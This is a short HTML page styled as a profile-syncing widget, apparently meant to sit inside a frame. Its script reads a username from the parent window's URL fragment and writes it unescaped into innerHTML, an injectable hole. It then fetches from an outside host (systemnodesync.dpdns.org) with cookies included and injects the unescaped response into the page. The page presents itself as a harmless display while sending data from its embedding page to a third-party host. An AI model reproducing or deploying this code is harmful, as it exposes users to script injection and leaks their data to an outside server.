<!DOCTYPE html>
<html>
    <head>
        <style>
    body { background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%); font-family: 'Segoe UI', sans-serif; display: flex; flex-wrap: wrap; gap: 20px; padding: 40px; justify-content: center; }
    .data-card {
        background: rgba(255, 255, 255, 0.8);
        backdrop-filter: blur(10px);
        border: 1px solid white;
        border-radius: 20px;
        padding: 20px;
        width: 220px;
        box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        transition: all 0.3s ease;
        text-align: center;
    }
    .data-card:hover { transform: translateY(-10px); box-shadow: 0 15px 35px rgba(167, 139, 250, 0.2); }
    .label { font-size: 0.75rem; text-transform: uppercase; color: #888; letter-spacing: 1px; margin-bottom: 8px; }
    .value { font-size: 1.4rem; font-weight: 800; color: #333; word-break: break-all; }
    .special { background: linear-gradient(to right, #ff00ea, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
</style>


    </head>

    <body>
        <div id="display">Syncing Profile...</div>
        <script>
            const parentHash = window.parent.location.hash;
            const userMatch = parentHash.match(/username=([^&?]+)/);
            const user = userMatch ? userMatch[1] : '';

            document.getElementById('display').innerHTML = `Fetching: <b>${user}</b>, a`;
            fetch(`https://systemnodesync.dpdns.org/api/v2/user-profile/cache/sync-manifest?username=${user}`, {
                    credentials: 'include'
                    })
                .then(response => response.json()).then(data => {
    document.body.innerHTML += Object.entries(data).map(([key, val]) => `
        <div class="data-card">
            <div class="label">${key.replace(/_/g, ' ')}</div>
            <div class="value ${typeof val === 'string' ? 'special' : ''}">
                ${typeof val === 'number' ? val.toLocaleString() : val}
            </div>
        </div>
    `).join('');
    });
    </script>
    </body>
</html>
